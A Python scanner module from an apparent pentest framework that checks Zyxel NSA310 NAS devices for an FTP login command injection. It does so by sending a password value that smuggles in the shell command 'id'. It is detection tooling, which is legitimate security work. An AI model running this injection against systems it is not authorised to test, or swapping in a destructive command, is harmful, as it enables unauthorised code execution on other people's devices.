#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zyxel NSA310 Pure-FTPd username command injection."""

import re
import socket

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        'name': 'Zyxel NSA310 - Pure-FTPd Command Injection Detection',
        'description': (
            'Detects Zyxel NSA310 FTP RCE by authenticating with user \' then '
            "pass '; id; and matching uid= in the FTP response."
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'scanner', 'tcp', 'ftp', 'zyxel', 'nas', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/39553/',
        ],
    }

    port = OptPort(21, 'FTP port', True)

    def run(self):
        host = self._host()
        port = self._port()
        if not host or not self.is_tcp_open(host, port):
            return False
        try:
            sock = socket.create_connection((host, port), timeout=self._timeout())
            sock.settimeout(self._timeout())
            banner = sock.recv(512).decode('latin-1', errors='replace')
            if 'Pure-FTPd' not in banner:
                sock.close()
                return False
            sock.sendall(b"user '\r\n")
            recv1 = sock.recv(512).decode('latin-1', errors='replace')
            if 'Password' not in recv1 and '331' not in recv1:
                sock.close()
                return False
            sock.sendall(b"pass '; id;\r\n")
            recv2 = sock.recv(512).decode('latin-1', errors='replace')
            sock.close()
        except Exception:
            return False
        if re.search(r'uid=\d+.*gid=\d+', recv2):
            self.set_info(
                severity='critical',
                reason='Zyxel NSA310 Pure-FTPd command injection',
                path=f'tcp/{port}',
            )
            return True
        return False
